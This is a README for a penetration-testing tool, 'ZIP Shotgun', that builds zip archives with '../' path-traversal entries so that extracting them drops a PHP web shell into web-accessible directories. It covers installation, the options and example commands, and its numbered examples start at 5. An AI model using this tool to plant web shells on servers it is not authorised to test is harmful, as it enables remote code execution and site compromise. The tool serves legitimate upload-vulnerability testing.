# ZIP Shotgun

Utility script to test zip file upload functionality (and possible extraction of zip files) for vulnerabilities.
Idea for this script comes from this post on [Silent Signal Techblog - Compressed File Upload And Command Execution](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)
and from [OWASP - Test Upload of Malicious Files](https://www.owasp.org/index.php/Test_Upload_of_Malicious_Files_%28OTG-BUSLOGIC-009%29)

This script will create archive which contains files with "../" in filename. When extracting this could cause files to be extracted to preceding directories.
It can allow attacker to extract shells to directories which can be accessed from web browser.

Default webshell is wwwolf's PHP web shell and all the credit for it goes to WhiteWinterWolf. Source is available [HERE](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

### Installation

1. Install using Python pip

    ```pip install zip-shotgun --upgrade```

2. Clone git repository and install

    ```git clone https://github.com/jpiechowka/zip-shotgun.git```

    Execute from root directory of the cloned repository (where setup.py file is located)

    ```pip install . --upgrade```

### Usage and options

```
Usage: zip-shotgun [OPTIONS] OUTPUT_ZIP_FILE

Options:
  --version                       Show the version and exit.
  -c, --directories-count INTEGER
                                  Count of how many directories to go back
                                  inside the zip file (e.g 3 means that 3
                                  files will be added to the zip: shell.php,
                                  ../shell.php and ../../shell.php where
                                  shell.php is the name of the shell you
                                  provided or randomly generated value
                                  [default: 16]
  -n, --shell-name TEXT           Name of the shell inside the generated zip
                                  file (e.g shell). If not provided it will be
                                  randomly generated. Cannot have whitespaces
  -f, --shell-file-path PATH      A file that contains code for the shell. If
                                  this option is not provided wwwolf
                                  (https://github.com/WhiteWinterWolf/wwwolf-
                                  php-webshell) php shell will be added
                                  instead. If name is provided it will be
                                  added to the zip with the provided name or
                                  if not provided the name will be randomly
                                  generated.
  --compress                      Enable compression. If this flag is set
                                  archive will be compressed using DEFALTE
                                  algorithm with compression level of 9. By
                                  default there is no compression applied.
  -h, --help                      Show this message and exit.
```

5. Provide custom shell file but use random name inside archive. Set directories count to 3

    ```zip-shotgun --directories-count 3 --shell-file-path ./custom-shell.php archive.zip```

    ```zip-shotgun -c 3  -f ./custom-shell.php archive.zip```

    Shell code will be extracted from user provided file. Names inside the archive will be randomly generated.

6. Provide custom shell file and set shell name to save inside archive. Set directories count to 3 and use compression

    ```zip-shotgun --directories-count 3 --shell-name custom-name --shell-file-path ./custom-shell.php --compress archive.zip```

    ```zip-shotgun -c 3 -n custom-name -f ./custom-shell.php --compress archive.zip```

    Shell code will be extracted from user provided file. Names inside the archive will be set to user provided name.
